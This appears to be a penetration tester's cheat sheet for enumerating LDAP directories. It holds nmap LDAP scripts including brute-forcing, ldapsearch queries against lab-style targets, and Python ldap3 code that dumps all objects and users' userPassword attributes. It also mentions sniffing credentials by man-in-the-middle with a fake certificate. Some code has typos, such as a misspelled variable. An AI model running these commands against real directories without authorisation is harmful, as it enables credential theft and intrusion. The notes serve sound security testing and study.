## nmap
nmap -p 389 --script ldap-rootdse (TARGET IP ADDRESS) -vv
nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=schema,dc=targetbox,dc=target"' (TARGET IP ADDRESS) -vv
You can change the Common Name, `cn`, attribute to attempt to get more data from the target system.
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials


## Other scripts
ldapminer -h IPADDRESS -p PORT -d
ldapsearch 

ldapsearch -h 10.10.10.182 -x -s base namingcontexts
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" 
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' 



#Basic Enum
python: 
```
import ldap3
server = ldap3.Server('10.10.10.10', get_info= ldap3.ALL, port= 636, use_ssl = True)
connetion = ldap3.Connection(server)
connection.bind()
server.info
```
if response is True you can get info like naming context or domain name 
once you have that info you can run this to get all objects on server
```
connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
```
or dump whole ldap
```
connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
```
if no SSL you can sniff creds via MTIM, if yes then use a fake certificate
once you have creds
`ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]`
brute force with
`ldapsearch -x -h <IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"`
`ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"`
if you see '_bind must not becompleted_' you can extract everything
```
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
-x Simple Authentication
-h LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
get users
`ldapsearch -x -h <IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"`
get computers
`ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TDL>"`


## CONFIG FILES
	 containers.ldif
	 ldap.cfg
	ldap.conf
            ldap.xml
            ldap-config.xml
            ldap-realm.xml
            slapd.conf
        IBM SecureWay V3 server
            V3.sas.oc
        Microsoft Active Directory server
            msadClassesAttrs.ldif
        Netscape Directory Server 4
            nsslapd.sas_at.conf
            nsslapd.sas_oc.conf
        OpenLDAP directory server
            slapd.sas_at.conf
            slapd.sas_oc.conf
           
